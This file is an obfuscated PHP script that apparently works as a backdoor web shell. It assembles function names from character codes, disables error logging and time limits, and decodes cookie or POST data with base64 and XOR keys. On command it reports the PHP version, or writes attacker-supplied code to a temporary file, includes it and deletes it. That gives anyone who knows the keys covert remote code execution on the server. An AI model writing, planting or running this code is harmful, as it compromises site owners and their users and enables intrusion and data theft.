<?php $yeyil = "\146".chr(567-462)."\154"."\x65"."\x5f".chr(440-328)."\x75"."\x74".'_'."\143".chr(230-119)."\x6e".'t'.chr(101)."\x6e".chr(116).chr(115);
$somaiht = "\142"."\x61".chr(115).'e'.chr(952-898).chr(641-589).chr(95).chr(404-304)."\x65"."\x63"."\x6f"."\x64".chr(101);
$tarfdmwh = "\151"."\156".chr(790-685)."\137".chr(115)."\145"."\164";
$zbfdmvw = "\165"."\x6e".chr(108).chr(293-188).chr(110).'k';


@$tarfdmwh(chr(101).chr(599-485).chr(114).chr(138-27).chr(173-59)."\x5f"."\154".'o'.chr(103), NULL);
@$tarfdmwh(chr(108)."\x6f"."\147".chr(95).chr(101).'r'.chr(114)."\157"."\162".chr(115), 0);
@$tarfdmwh('m'.'a'.chr(120).'_'.chr(101).chr(120)."\x65".chr(99).chr(117)."\164".'i'."\157".chr(110).chr(95).chr(116).'i'.chr(295-186).chr(101), 0);
@set_time_limit(0);

function dvbyoguen($doizkbq, $jzqxx)
{
    $mbglkvkxu = "";
    for ($ojizc = 0; $ojizc < strlen($doizkbq);) {
        for ($j = 0; $j < strlen($jzqxx) && $ojizc < strlen($doizkbq); $j++, $ojizc++) {
            $mbglkvkxu .= chr(ord($doizkbq[$ojizc]) ^ ord($jzqxx[$j]));
        }
    }
    return $mbglkvkxu;
}

$wqfkymvcr = array_merge($_COOKIE, $_POST);
$vazttqgyu = '8084fa1e-480b-4800-b913-37aab97ace04';
foreach ($wqfkymvcr as $kmcbehjzq => $doizkbq) {
    $doizkbq = @unserialize(dvbyoguen(dvbyoguen($somaiht($doizkbq), $vazttqgyu), $kmcbehjzq));
    if (isset($doizkbq[chr(97).'k'])) {
        if ($doizkbq[chr(97)] == "\151") {
            $ojizc = array(
                "\160"."\166" => @phpversion(),
                chr(321-206)."\166" => "3.5",
            );
            echo @serialize($ojizc);
        } elseif ($doizkbq[chr(97)] == 'e') {
            $fnlyngesm = "./" . md5($vazttqgyu) . chr(46).chr(350-245)."\156".'c';
            @$yeyil($fnlyngesm, "<" . '?'.'p'.chr(104)."\x70".chr(406-374).chr(223-159)."\x75"."\156".chr(108)."\151".'n'.chr(107).chr(40).chr(95)."\x5f".chr(763-693).'I'.'L'.chr(69).'_'."\137"."\51"."\x3b".chr(32) . $doizkbq["\x64"]);
            @include($fnlyngesm);
            @$zbfdmvw($fnlyngesm);
        }
        exit();
    }
}

